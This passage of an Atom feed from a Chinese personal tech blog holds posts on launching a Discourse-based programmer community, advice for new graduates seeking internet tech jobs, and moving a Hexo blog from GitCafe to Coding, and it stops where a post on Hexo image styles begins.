&lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;h3 id=&quot;自动拓展链接信息&quot;&gt;&lt;a href=&quot;#自动拓展链接信息&quot; class=&quot;headerlink&quot; title=&quot;自动拓展链接信息&quot;&gt;&lt;/a&gt;自动拓展链接信息&lt;/h3&gt;&lt;p&gt;想要分享东西？直接粘贴链接，我们会显示关于链接的详细信息。&lt;/p&gt;
&lt;p&gt;链接至维基百科、GitHub、Twitter、Youtube和其他流行的网站就会自动显示扩展信息面板。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://dn-coderq.qbox.me/uploads/default/43/e7df0ecec539ec54.gif&quot; class=&quot;img-shadow&quot;&gt;&lt;/p&gt;
&lt;p&gt;还有很多有意思的特性，感兴趣的可以去 &lt;a href=&quot;https://coderq.com/t/ma-nong-quan-de-te-se-gong-neng/38&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;码农圈的特色功能&lt;/a&gt; 看看。&lt;/p&gt;
&lt;p&gt;Discourse 是用 Ruby on Rails 写的，用 PostgreSQL 做存储，用 Redis 做缓存。目前「码农圈」搭建在 &lt;a href=&quot;https://www.digitalocean.com/?refcode=54668030e22a&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;DigitalOcean&lt;/a&gt; 上，使用 &lt;a href=&quot;https://www.namecheap.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;NameCheap&lt;/a&gt; 颁发的 SSL 证书为网站加上了 HTTPS（更安全），使用&lt;a href=&quot;https://portal.qiniu.com/signup?code=3l91ovmeed8ia&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;七牛云存储&lt;/a&gt;为网站加上了 CDN（更快速）。另外还做了一些本地化的工作，使之更符合国人的习惯。加了一些插件，如微博微信分享等。改了一些主题样式，使之更符合我的口味。希望你们能喜欢上它！&lt;/p&gt;
&lt;p&gt;是程序员就加入&lt;a href=&quot;https://coderq.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;「码农圈」&lt;/a&gt;吧！&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://coderq.com&quot; &gt;&lt;img src=&quot;https://dn-coderq.qbox.me/uploads/default/17/7dac137579f3f0b5.png&quot; class=&quot;img-logo&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;做一个面向程序员交流分享学习的社区吧！&lt;/p&gt;
&lt;p&gt;这个想法从一个月前的某个晚上就跳进了我的脑袋，之后好几个晚上因此兴奋地睡不着觉，呵呵。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;现在已经有类似的网站啦，像 segmentfault , V2EX , OurCoders , 甚至知乎里的某些板块。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;为什么还要有&lt;a href=&quot;https://coderq.com&quot;&gt;「码农圈」&lt;/a&gt;呢？&lt;/p&gt;
&lt;p&gt;诚然，目前国内已经有很多耳熟能详的类似网站了，但是相信每一个细分的市场都有很大的空间。而我想做的自然有其独到的特点。首先，这是一个以交流分享为主的网站，不同于 segmentfault 专注于技术交流。在这里气氛可以更加活跃。&lt;/p&gt;
&lt;p&gt;程序员是一个很独特的群体，他们可以因为一些 which better 的问题而争论不休，他们都有非常类似的特征，勤劳而聪慧，更重要的是，他们正在改变世界！正是这个群体，他们不仅需要讨论技术，他们同样也要找女朋友、结婚买房、会有生活上的烦恼困惑，会想换工作、想移民、想创业等等。正是基于这一点，「码农圈」的想法逐渐开始在我的脑海里成形，而它并不完全同于现有网站。&lt;/p&gt;
&lt;p&gt;「码农圈」是一个以交流分享为主的网站，不同于 segmentfault 专注于技术问答类。「码农圈」是一个专注于程序员群体的社区，不同于 V2EX 的创意工作者们和知乎的广大群体们，在这里的信息会更加垂直更加社区化。「码农圈」是一个论坛形式的社区，这也不同于上面的问答形社区。最主要的是「码农圈」足够酷、足够方便、能适配各种端，这也是不同于北邮人这些传统论坛的方面。&lt;/p&gt;
&lt;p&gt;程序员可以在这里交流一切，包括技术、人生、梦想乃至情感。不同于专业技术社区的压抑，在这里气氛会更加活跃，在这里你会与广大程序员有更多的共鸣。&lt;/p&gt;
    
    </summary>
    
      <category term="随笔生活" scheme="http://wuchong.me/categories/%E9%9A%8F%E7%AC%94%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="码农圈" scheme="http://wuchong.me/tags/%E7%A0%81%E5%86%9C%E5%9C%88/"/>
    
      <category term="Discourse" scheme="http://wuchong.me/tags/Discourse/"/>
    
  </entry>
  
  <entry>
    <title>应届生如何找互联网工作</title>
    <link href="http://wuchong.me/blog/2014/12/21/how-to-find-internet-job/"/>
    <id>http://wuchong.me/blog/2014/12/21/how-to-find-internet-job/</id>
    <published>2014-12-21T07:06:16.000Z</published>
    <updated>2016-03-08T12:12:36.000Z</updated>
    
    <content type="html">&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/mw690/81b78497jw1enhbntged4j20l30hkgnb.jpg&quot; class=&quot;img-topic&quot;&gt;&lt;/p&gt;
&lt;p&gt;“就你，才面了几家公司还给别人指路啊？”，尽管会有人有这样那样的质疑，但我还是非常想说说这个话题，希望后来者不要再踩我的坑，希望能有更明确的努力方向，找到期望的工作。&lt;/p&gt;
&lt;p&gt;距离&lt;a href=&quot;http://wuchong.me/blog/2014/09/30/looking-for-a-job-summary/&quot;&gt;找工作小记&lt;/a&gt;后，已经过去两个多月了，2014 校招季也靠一段落。由于我找的都是互联网方向的公司，所以本篇也主要针对如何找互联网技术类岗位。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;清晰的目标&quot;&gt;&lt;a href=&quot;#清晰的目标&quot; class=&quot;headerlink&quot; title=&quot;清晰的目标&quot;&gt;&lt;/a&gt;清晰的目标&lt;/h2&gt;&lt;p&gt;大多数人觉得找工作应该是撒大网捕鱼，不应该在一棵树上吊死，老师们也这样好心地建议我们。但是我不这样认为，我认为人的精力是有限的，把有限的精力分散到多个方向，最后只会迷失自己。就像有些本科毕业生，又是找工作又是考研又是国考的，最后都没啥好结果。&lt;/p&gt;
&lt;p&gt;所以，从一开始我就明确自己只找互联网技术类岗位，没有考虑过银行国企公务员等方向（当然如果有人找到了心仪的工作，再去其他方向碰碰机会也无可厚非）。我认为这是很重要的，作为一名应届生，应该有了自己的职业规划知道了自己喜欢的方向，不应该是迷茫或随从的状态。&lt;/p&gt;
&lt;p&gt;其次，这个方向应该是越细致越好。大家都知道 IT 行业要细分，一双手都数不过来。如果你能清晰自己想从事的方向（安全？前端？数据挖掘？），并为此付出一定的准备，你会发现你其实没花多大力气就脱颖而出了。&lt;/p&gt;
&lt;p&gt;如我，在一年多前就明确自己想进阿里中间件团队。&lt;/p&gt;
&lt;p&gt;不知道自己喜欢什么方向？那就挑自己擅长或熟悉的。没有擅长或熟悉的？那就了解技术发展趋势，选一个趋势向上的。&lt;/p&gt;
&lt;h2 id=&quot;厚积薄发&quot;&gt;&lt;a href=&quot;#厚积薄发&quot; class=&quot;headerlink&quot; title=&quot;厚积薄发&quot;&gt;&lt;/a&gt;厚积薄发&lt;/h2&gt;&lt;p&gt;有了明确的目标后，就可以去招聘网站看对应岗位的需求了，对着自己把一项项缺少的技能点记下来，并未自己制定一个详细的练级计划。在制定计划和练级期间，可能会对前进方向有些迷茫，这时可以请教行业领域的大牛。如我，加了老多阿里中间件牛人的微博，一个个问自己的疑惑，一般大牛都很乐于帮忙的。&lt;/p&gt;
&lt;p&gt;一般IT公司的校招在每年的8月到12月，某些公司会在3月后有一次实习生招聘。所以，如果你是年初才开始准备，如果还要参加实习，那么留给你的时间真的不多。&lt;/p&gt;
&lt;h3 id=&quot;实习与项目经历&quot;&gt;&lt;a href=&quot;#实习与项目经历&quot; class=&quot;headerlink&quot; title=&quot;实习与项目经历&quot;&gt;&lt;/a&gt;实习与项目经历&lt;/h3&gt;&lt;p&gt;国内公司面试喜欢先按着简历上的聊，一般都会聊到实习经历（如果有）和项目经历，如果有论文也会聊论文。比如，我经常会被问到“谈谈你最有成就感的一个项目？”，所以最好有一个能拿得出手，背得滚瓜烂熟的项目。所谓能拿的出手，是指最好能演示，有些技术问题、技术难点的项目。关键是能把项目流程、关键点、难点、解决方案等等流利地说出来。&lt;/p&gt;
&lt;p&gt;项目不在多，一两个即可。我在准备面试的时候，才发现我的项目经历非常尴尬，做过的项目不少，却没有能拿的出手的。能勉强拿出手的居然是一个 .Net 项目，结果一路被各大面试官鄙视过来…&lt;/p&gt;
&lt;p&gt;如果你发现和我一样，没关系，你还有半年时间准备。你可以挑一个还可以的项目进行一些技术改造；也可以参加个实习，用实习项目来镇住面试官；也可以参与开源项目，或者自己写点有意思的项目（并开源）。个人比较推荐后者，因为这个过程中，你能学到更多诸如版本控制、多人协作的知识，最主要是高逼格。&lt;/p&gt;
&lt;p&gt;至于实习，在我看来是一把双刃剑。如果实习公司是自己的意向公司，那还是不错的。最好能去知名企业实习，表现好的都可以获得正式 Offer。就算没拿到，也可以为简历加分。但是，很可能因为实习的原因失去了复习巩固基础的时间，导致在面试中吃亏，失去更好的工作机会。所以，大家一定要考虑清楚。特别是已经有拿的出手的项目经历，实习不是那么必须了，还不如拿这些时间多阅读研究一些技术书籍。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/mw690/81b78497jw1enhbo5h8d7j21kw16okg6.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;算法与数据结构&quot;&gt;&lt;a href=&quot;#算法与数据结构&quot; class=&quot;headerlink&quot; title=&quot;算法与数据结构&quot;&gt;&lt;/a&gt;算法与数据结构&lt;/h3&gt;&lt;p&gt;算法和白板编程基本是互联网公司面试的家常菜。不管是应聘什么方向岗位，这一块都应该加强训练。国外公司比较看重算法编程，面试基本以算法题为主。国内公司的算法题难度相对不大，基本刷完主流题目就够了。&lt;/p&gt;
&lt;p&gt;书籍方面按优先级推荐分别是&lt;a href=&quot;http://book.douban.com/subject/6966465/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《剑指Offer》&lt;/a&gt;、&lt;a href=&quot;http://book.douban.com/subject/25753386/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《程序员面试金典》&lt;/a&gt;、&lt;a href=&quot;http://book.douban.com/subject/3004255/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《编程之美》&lt;/a&gt;。剑指中代码是C++写的，程序员面试金典是 Java 的。所以不同语言方向的可以选一本。推荐精读一本，泛读另两本就可以了。电子书的话非常推荐 July 写的&lt;a href=&quot;https://github.com/julycoding/The-Art-Of-Programming-By-July/blob/master/ebook/zh/Readme.md&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;程序员编程艺术&lt;/a&gt;，可以迅速带你入门。July 的书籍应该马上上市了，可以关注下。&lt;/p&gt;
&lt;p&gt;单靠看书的效果是比较差的，推荐书籍看的差不多的时候，可以配合 &lt;a href=&quot;https://oj.leetcode.com/problems/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;LeetCode&lt;/a&gt; 一起修炼，功力将会大增。LeetCode 目前题目已经出到第 168 题了，刷完的话应付国内公司真是绰绰有余了。在做题过程中尽量不要看题解和别人的答案，而在做完之后推荐多了解别人的做法会拓宽你的思路。另外官方出了本 &lt;a href=&quot;https://oj.leetcode.com/book/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;LeetCode Book&lt;/a&gt;，但是好贵…&lt;/p&gt;
&lt;h3 id=&quot;开放型题目&quot;&gt;&lt;a href=&quot;#开放型题目&quot; class=&quot;headerlink&quot; title=&quot;开放型题目&quot;&gt;&lt;/a&gt;开放型题目&lt;/h3&gt;&lt;p&gt;面试官一般会针对你的岗位方向问一些开放型的题目，没有固定的答案，更多的是考察技术面广度深度。比如大数据处理技术、机器学习算法、网络传输、内存管理、开放型设计题、数据库的索引等等。这些只能通过平时多看多了解了，遇到问题喜欢刨根问底。&lt;/p&gt;
&lt;p&gt;作为一名应届程序员，除了掌握一门静态语言外，还应该掌握一门动态语言，熟悉 Linux 的操作，深入的话可以了解 Unix 编程。Java 方向的应该深入学习 JVM 知识，C++ 方向的至少得看看&lt;a href=&quot;http://book.douban.com/subject/5387403/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《Effective C++》&lt;/a&gt;吧。&lt;/p&gt;
&lt;h2 id=&quot;简历&quot;&gt;&lt;a href=&quot;#简历&quot; class=&quot;headerlink&quot; title=&quot;简历&quot;&gt;&lt;/a&gt;简历&lt;/h2&gt;&lt;p&gt;简历是你迈向工作的第一步，但大多程序员不知道如何表达自己，而埋没了自己的才华。对于应届生来说，非常头疼的是简历该怎么写，写什么，用什么工具，写成什么格式。&lt;/p&gt;
&lt;p&gt;作为一封技术简历，只需要包含三方面：第一是个人信息和联系方式，第二是实习和项目经历，第三是技术能力证明。不要有太多与求职岗位无关的经验过分描述，比如性别、主修课程、自我评价等。看看这些文章，你会了解如何更优雅地写简历：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://coderq.com/t/a-li-ba-ba-xiao-zhao-nei-tui-jian-li-shai-xuan-fang-an/143/1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;阿里巴巴校招内推简历筛选方案&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.lucida.me/blog/lean-technical-resume/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;精益技术简历之道——改善技术简历的47条原则&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.zheyibu.com/article/1353.html?xa?nikki&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;身为HR的我是这样挑实习生的&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;至于工具和格式，作为程序员都应该用 MarkDown写，用PDF发。发求职邮件时的注意事项可以看看 @Fenng 大大写的 &lt;a href=&quot;http://dbanotes.net/review/resume_email.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;写一封「用户体验」良好的求职邮件&lt;/a&gt; 。如果你有一个在线简历，那就更（BI）好（GE）了，你可以直接在邮件里附上你的在线简历地址，相对于下载附件 HR 会更欣喜于打开在线简历。可以参考本人的&lt;a href=&quot;http://wuchong.me/resume.html&quot;&gt;在线简历&lt;/a&gt;，工具已开源在 &lt;a href=&quot;https://github.com/wuchong/resume.git&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub&lt;/a&gt; 上。也推荐这些比较优秀的在线简历生成工具。比如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://get.jobdeer.com/745.get&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;DeerResume：在线MarkDown简历工具&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/c0bra/markdown-resume-js&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;基于Node.js的MarkDown简历生成工具&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;笔试&quot;&gt;&lt;a href=&quot;#笔试&quot; class=&quot;headerlink&quot; title=&quot;笔试&quot;&gt;&lt;/a&gt;笔试&lt;/h2&gt;&lt;p&gt;笔试就是个坑，能逃就逃。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/mw690/81b78497jw1enhbnrqon3j21kw122qdc.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;笔试的考察面会更全一些，除了基础知识还会涉及语言细节、概率论、智力题等。&lt;/p&gt;
&lt;h2 id=&quot;内推&quot;&gt;&lt;a href=&quot;#内推&quot; class=&quot;headerlink&quot; title=&quot;内推&quot;&gt;&lt;/a&gt;内推&lt;/h2&gt;&lt;p&gt;内推一般都能跳过笔试阶段，还能提前拿到校招 Offer，就算失败也不会影响正式校招，多了一次面试经验，何乐而不为。可以直接找师兄，也可以多留意一下 BBS 上的内推信息。&lt;/p&gt;
&lt;h2 id=&quot;面试&quot;&gt;&lt;a href=&quot;#面试&quot; class=&quot;headerlink&quot; title=&quot;面试&quot;&gt;&lt;/a&gt;面试&lt;/h2&gt;&lt;p&gt;面试过程只要充分展示自己准备的东西就可以了。面试是一个双方的过程，一定要掌握面试的主动性，要多说话，不要让气氛冷下来，慢慢推动面试朝着自己擅长的方向引导。要知道，一场面试是有时间限制的，这场面试在你熟悉的领地打的越久，胜利的机会也就越高。&lt;/p&gt;
&lt;h2 id=&quot;写在最后&quot;&gt;&lt;a href=&quot;#写在最后&quot; class=&quot;headerlink&quot; title=&quot;写在最后&quot;&gt;&lt;/a&gt;写在最后&lt;/h2&gt;&lt;p&gt;国内大学里的课程很多都照本宣科，很少能在面试和以后的工作中帮到我们。这是坏事，也是好事。坏处不用说，好处是只要比别人稍稍努力些就可以脱颖而出。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可以上 &lt;a href=&quot;https://www.coursera.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Coursera&lt;/a&gt;  看一些国外知名大学的公开课，拿到证书的话也是一个不错的加分项呐。&lt;/li&gt;
&lt;li&gt;在学习理论知识的同时能够尽量尝试实践一下，比如学习了Unix网络通信，有没有自己动手写一个聊天工具。&lt;/li&gt;
&lt;li&gt;好记性不如烂笔头。学习过程中勤做笔记，复习时效率会更高。推荐 &lt;a href=&quot;https://www.yinxiang.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;印象笔记&lt;/a&gt;。&lt;/li&gt;
&lt;li&gt;建立个人博客。把笔记整理一下就能发表一篇不错的博文，不仅帮助自己梳理知识，还能帮助别人。建立个人博客不是为了面试，而是更重要的：树立个人品牌。后者是会伴随你一辈子的。&lt;a href=&quot;http://mindhacks.cn/2009/02/15/why-you-should-start-blogging-now/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;为什么你应该（从现在开始就）写博客&lt;/a&gt; 以及&lt;a href=&quot;https://selfstore.io/products/190&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《程序员跳槽攻略》&lt;/a&gt;中的个人品牌章节。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最后，希望本文对即将找工作的朋友能有帮助。欢迎提问，欢迎大牛指正。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/mw690/81b78497jw1enhbntged4j20l30hkgnb.jpg&quot; class=&quot;img-topic&quot;/&gt;&lt;/p&gt;
&lt;p&gt;“就你，才面了几家公司还给别人指路啊？”，尽管会有人有这样那样的质疑，但我还是非常想说说这个话题，希望后来者不要再踩我的坑，希望能有更明确的努力方向，找到期望的工作。&lt;/p&gt;
&lt;p&gt;距离&lt;a href=&quot;http://wuchong.me/blog/2014/09/30/looking-for-a-job-summary/&quot;&gt;找工作小记&lt;/a&gt;后，已经过去两个多月了，2014 校招季也靠一段落。由于我找的都是互联网方向的公司，所以本篇也主要针对如何找互联网技术类岗位。&lt;/p&gt;
    
    </summary>
    
      <category term="职场生涯" scheme="http://wuchong.me/categories/%E8%81%8C%E5%9C%BA%E7%94%9F%E6%B6%AF/"/>
    
    
      <category term="面试" scheme="http://wuchong.me/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>托管 Hexo 博客到 Coding</title>
    <link href="http://wuchong.me/blog/2014/12/18/hexo-blog-to-coding/"/>
    <id>http://wuchong.me/blog/2014/12/18/hexo-blog-to-coding/</id>
    <published>2014-12-18T13:47:13.000Z</published>
    <updated>2016-03-08T12:11:15.000Z</updated>
    
    <content type="html">&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/large/81b78497jw1ene69i4dilj20b4036aa7.jpg&quot; class=&quot;img-topic&quot;&gt;&lt;/p&gt;
&lt;p&gt;前两天收到了 GitCafe 的紧急邮件，大意就是说：由于「有关部门」查水表，我们的 GitCafe Pages 服务需要暂时关闭自定义域名功能。当时就有点想 F*uking XXX，当然不是指 GitCafe，大家都懂。&lt;/p&gt;
&lt;p&gt;根据 GitCafe 的提示，只需要修改 DNS 配置中的 A 记录为 CNAME 到 xxx.gitcafe.io 即可。但是，貌似 GitCafe 有些手忙脚乱 gitcafe.io 还没有上线，导致会跳到 gitcafe 的个人活动页面。这里其实直接用 A 记录指到  207.226.141.135 就可以。不过你会发现，你的域名变成了 xxx.gitcafe.com 。作为强迫症患者，这怎么能忍？&lt;/p&gt;
&lt;p&gt;难道又要迁回水土不服，国内老挂的 GitHub 上吗？这时候 Coding 出现了。（你说Coding君是不是应该给点广告费？）&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;迁移到-Coding&quot;&gt;&lt;a href=&quot;#迁移到-Coding&quot; class=&quot;headerlink&quot; title=&quot;迁移到 Coding&quot;&gt;&lt;/a&gt;迁移到 Coding&lt;/h2&gt;&lt;p&gt;“Coding 是一个面向开发者的云端开发平台，目前提供代码托管，运行空间，质量控制，项目管理等功能。”好吧，我们只想用托管功能和最近新出的&lt;a href=&quot;https://coding.net/u/panpan/p/Coding-PaaS/topic/10263&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;自定义域名·免备案&lt;/a&gt;。&lt;/p&gt;
&lt;h3 id=&quot;创建项目&quot;&gt;&lt;a href=&quot;#创建项目&quot; class=&quot;headerlink&quot; title=&quot;创建项目&quot;&gt;&lt;/a&gt;创建项目&lt;/h3&gt;&lt;p&gt;创建一个博客项目，名称无所谓，然后在项目页面获取 SSH 或 HTTPS 地址。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/large/81b78497jw1ene5wf0vh8j20yz0doq5w.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;推送代码&quot;&gt;&lt;a href=&quot;#推送代码&quot; class=&quot;headerlink&quot; title=&quot;推送代码&quot;&gt;&lt;/a&gt;推送代码&lt;/h3&gt;&lt;p&gt;修改 Hexo 根目录下的配置文件&lt;code&gt;_config.yml&lt;/code&gt;，修改最后的 deploy 参数。&lt;br&gt;&lt;figure class=&quot;highlight less&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attribute&quot;&gt;deploy&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attribute&quot;&gt;type&lt;/span&gt;: github&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attribute&quot;&gt;repo&lt;/span&gt;: &lt;span class=&quot;attribute&quot;&gt;https&lt;/span&gt;:&lt;span class=&quot;comment&quot;&gt;//coding.net/jark/blog.git  #改成你的项目地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attribute&quot;&gt;branch&lt;/span&gt;: master&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;如果你使用的是 SSH 地址，还需要设置&lt;a href=&quot;https://coding.net/user/setting/keys&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;SSH公钥&lt;/a&gt;。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;然后运行&lt;code&gt;hexo d&lt;/code&gt;就会推送代码到 Coding 项目上。（最好先&lt;code&gt;hexo clean&lt;/code&gt;并删除目录下的&lt;code&gt;.deploy&lt;/code&gt;文件夹）&lt;/p&gt;
&lt;h3 id=&quot;部署项目&quot;&gt;&lt;a href=&quot;#部署项目&quot; class=&quot;headerlink&quot; title=&quot;部署项目&quot;&gt;&lt;/a&gt;部署项目&lt;/h3&gt;&lt;p&gt;在「演示」标签页下，点击“开始检测”（不管提示，强制开启）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/81b78497jw1ene5wa2fkzj20w70he41z.jpg&quot; alt=&quot;&quot;&gt; &lt;/p&gt;
&lt;p&gt;在开启功能中，我们选择香港节点（因为只有香港节点提供免费自定义域名服务）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww3.sinaimg.cn/large/81b78497jw1ene5wavsc4j20tk07r0tp.jpg&quot; alt=&quot;&quot;&gt; &lt;/p&gt;
&lt;p&gt;然后进入控制台，配置部署版本为&lt;code&gt;master&lt;/code&gt;分支，运行环境为&lt;code&gt;HTML&lt;/code&gt;，选择自定义域名并填写自己的域名。最后点击“一键部署”！ （内存好多，不过懒得改了）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/large/81b78497jw1ene5wcxf84j20qk0hrjug.jpg&quot; alt=&quot;&quot;&gt; &lt;/p&gt;
&lt;p&gt;稍等片刻后就可以看到运行中的项目了。 &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww3.sinaimg.cn/large/81b78497jw1ene5wbneo4j20qw0eigns.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;资源浪费好多…太任性了…&lt;/p&gt;
&lt;h3 id=&quot;更改DNS&quot;&gt;&lt;a href=&quot;#更改DNS&quot; class=&quot;headerlink&quot; title=&quot;更改DNS&quot;&gt;&lt;/a&gt;更改DNS&lt;/h3&gt;&lt;p&gt;最后一步，官方说法是将域名的 CNAME 记录值指向 api.codingapp.com。但如果你用的是根域名，可能会提示 CNAME 和 MX 记录冲突。这里可以使用 A 记录指向 119.9.72.107 ，效果是一样的。&lt;/p&gt;
&lt;p&gt;在浏览器中输入你的域名，能看到访问正常，并且不会变成恶心的某二级域名。PING 一下，发现速度也还不错。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/81b78497jw1ene62w9z3aj216g0vywo7.jpg&quot; alt=&quot;&quot;&gt; &lt;/p&gt;
&lt;h2 id=&quot;写在最后&quot;&gt;&lt;a href=&quot;#写在最后&quot; class=&quot;headerlink&quot; title=&quot;写在最后&quot;&gt;&lt;/a&gt;写在最后&lt;/h2&gt;&lt;p&gt;有些不足的地方是，每当博客需要更新时，不仅要&lt;code&gt;hexo d&lt;/code&gt;推送代码上去，还需要去控制台“一键部署”。&lt;/p&gt;
&lt;p&gt;香港节点提供自定义域名，但只免费开放到 2015 年前。不过官方有个福利，如果平均每两个月有一篇原创技术博客产出，就可以向 &lt;a href=&quot;https://coding.net/u/coding&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@Coding&lt;/a&gt; 提出申请免费使用自定义域名服务。&lt;/p&gt;
&lt;p&gt;不过估计年底前，GitCafe 就该重新开放自定义域名了吧。真的非常感谢 GitCafe 一直以来的努力，非常好的产品。希望 GitCafe 能挺过这一关。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;PS:有任何关于 Hexo 的问题，欢迎来 &lt;a href=&quot;https://coderq.com/c/tech/hexo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo 中文社区&lt;/a&gt; 咨询。&lt;/em&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/large/81b78497jw1ene69i4dilj20b4036aa7.jpg&quot; class=&quot;img-topic&quot;/&gt;&lt;/p&gt;
&lt;p&gt;前两天收到了 GitCafe 的紧急邮件，大意就是说：由于「有关部门」查水表，我们的 GitCafe Pages 服务需要暂时关闭自定义域名功能。当时就有点想 F*uking XXX，当然不是指 GitCafe，大家都懂。&lt;/p&gt;
&lt;p&gt;根据 GitCafe 的提示，只需要修改 DNS 配置中的 A 记录为 CNAME 到 xxx.gitcafe.io 即可。但是，貌似 GitCafe 有些手忙脚乱 gitcafe.io 还没有上线，导致会跳到 gitcafe 的个人活动页面。这里其实直接用 A 记录指到  207.226.141.135 就可以。不过你会发现，你的域名变成了 xxx.gitcafe.com 。作为强迫症患者，这怎么能忍？&lt;/p&gt;
&lt;p&gt;难道又要迁回水土不服，国内老挂的 GitHub 上吗？这时候 Coding 出现了。（你说Coding君是不是应该给点广告费？）&lt;/p&gt;
    
    </summary>
    
      <category term="Hexo" scheme="http://wuchong.me/categories/Hexo/"/>
    
    
      <category term="Hexo" scheme="http://wuchong.me/tags/Hexo/"/>
    
      <category term="Coding" scheme="http://wuchong.me/tags/Coding/"/>
    
  </entry>
  
  <entry>
    <title>为 Hexo 主题添加多种图片样式</title>
    <link href="http://wuchong.me/blog/2014/12/13/hexo-theme-creating-image-styles/"/>
    <id>http://wuchong.me/blog/2014/12/13/hexo-theme-creating-image-styles/</id>
    <published>2014-12-13T12:11:56.000Z</published>
    <updated>2016-03-08T12:11:35.000Z</updated>
    
    <content type="html">&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/large/81b78497jw1en8b95t5kmj203j00u743.jpg&quot; class=&quot;img-logo&quot;&gt;&lt;/p&gt;
&lt;p&gt;为一篇博客添加相关的图片可以快速吸引读者的目光，也能帮助读者理解文章概要，尤其是在写技术博客或是某些很复杂的东西时。&lt;/p&gt;
&lt;p&gt;然而，Hexo 主题一般只提供一种默认的图片样式，包括 Jacman。所以，我为 Jacman 实现了几种常见的图片样式。这里我会展示这几种图片样式以及其实现方法。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
